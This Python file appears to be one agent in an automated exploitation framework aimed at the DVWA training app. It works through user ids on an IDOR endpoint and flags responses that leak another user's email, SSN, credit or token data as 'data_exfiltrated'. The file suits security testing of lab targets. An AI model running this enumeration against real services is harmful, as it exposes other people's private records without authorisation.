"""Tier 2 IDOR agent."""

from __future__ import annotations

import re
from typing import Any

from agents.base_agent import BaseAgent
from agents.state_utils import (
    already_tried_payloads,
    append_error_marker,
    make_update,
    module_endpoint,
    normalize_security_level,
    prepare_agent_session,
)
from core.state import ExploitationState
from foundation.http_client import RequestTimeoutError, TransportError
from foundation.payload_library import PayloadLibrary
from foundation.session_manager import DVWASession
from foundation.verifier import Verifier


UNAUTHORIZED_DATA_SIGNALS = ["email", "address", "phone", "ssn", "credit", "token"]
ACCESS_DENIED_SIGNALS = ["access denied", "not authorized", "forbidden", "permission denied"]
USER_ID_RE = re.compile(r"user[_\s-]?id\s*[:=]\s*(\d+)", re.IGNORECASE)


class IDORAgent(BaseAgent):
    module_name = "idor"

    def __init__(self) -> None:
        self.payloads = PayloadLibrary()
        self.verifier = Verifier()

    def check_prerequisites(self, state: ExploitationState) -> bool:
        return True

    @staticmethod
    def _extract_user_ids(body: str) -> set[str]:
        return set(USER_ID_RE.findall(body or ""))

    def run(self, state: ExploitationState) -> dict[str, Any]:
        target_url = state.get("target_url", "")
        level = normalize_security_level(state.get("security_level"))
        endpoint = module_endpoint(state, self.module_name, "/vulnerabilities/idor/")
        payload_set = self.payloads.get(self.module_name, level)
        already_tried = already_tried_payloads(state, self.module_name)

        score = 0
        confirmed: list[str] = []
        outcomes: list[str] = []
        tried_now: list[str] = []

        if not target_url:
            return make_update(
                state=state,
                module_name=self.module_name,
                score=score,
                tried_payloads=tried_now,
            )

        test_ids = ["1", "2", "3"]
        for token in list(payload_set.probe) + list(payload_set.exploit):
            if token.startswith("id="):
                test_ids.append(token.split("=", 1)[1])

        session = DVWASession(target_url)
        try:
            ready, prep_notes = prepare_agent_session(session, level, require_login=True)
            tried_now.extend(prep_notes)
            if not ready:
                return make_update(
                    state=state,
                    module_name=self.module_name,
                    score=score,
                    tried_payloads=tried_now,
                )

            baseline_marker = f"id={test_ids[0]}"
            baseline = session.get(endpoint, params={"id": test_ids[0]})
            baseline_body = baseline.text or ""
            baseline_ids = self._extract_user_ids(baseline_body)
            if baseline_marker not in already_tried:
                tried_now.append(baseline_marker)

            candidate_ids = [candidate for candidate in test_ids[1:] if f"id={candidate}" not in already_tried]
            if not candidate_ids:
                candidate_ids = test_ids[1:]

            for candidate in candidate_ids:
                marker = f"id={candidate}"
                if marker not in already_tried:
                    tried_now.append(marker)
                response = session.get(endpoint, params={"id": candidate})
                body = response.text or ""
                candidate_ids = self._extract_user_ids(body)

                if body != baseline_body:
                    score = max(score, 1)
                    if "idor_confirmed" not in confirmed:
                        confirmed.append("idor_confirmed")

                sensitive_data = self.verifier.contains_any(body, UNAUTHORIZED_DATA_SIGNALS).ok
                access_denied = self.verifier.contains_any(body, ACCESS_DENIED_SIGNALS).ok
                identity_switched = bool(candidate_ids - baseline_ids)

                if body != baseline_body and sensitive_data and identity_switched and not access_denied:
                    score = 3
                    confirmed = ["idor_confirmed", "data_exfiltrated"]
                    outcomes = ["data_exfiltrated"]
                    break
        except (TransportError, RequestTimeoutError, RuntimeError, ValueError) as exc:
            append_error_marker(tried_now, "idor_runtime_error", exc)
        finally:
            session.close()

        return make_update(
            state=state,
            module_name=self.module_name,
            score=score,
            tried_payloads=tried_now,
            confirmed_vulns=confirmed,
            achieved_outcomes=outcomes,
        )


_AGENT = IDORAgent()


def idor_agent(state: ExploitationState) -> dict[str, Any]:
    return _AGENT.run(state)
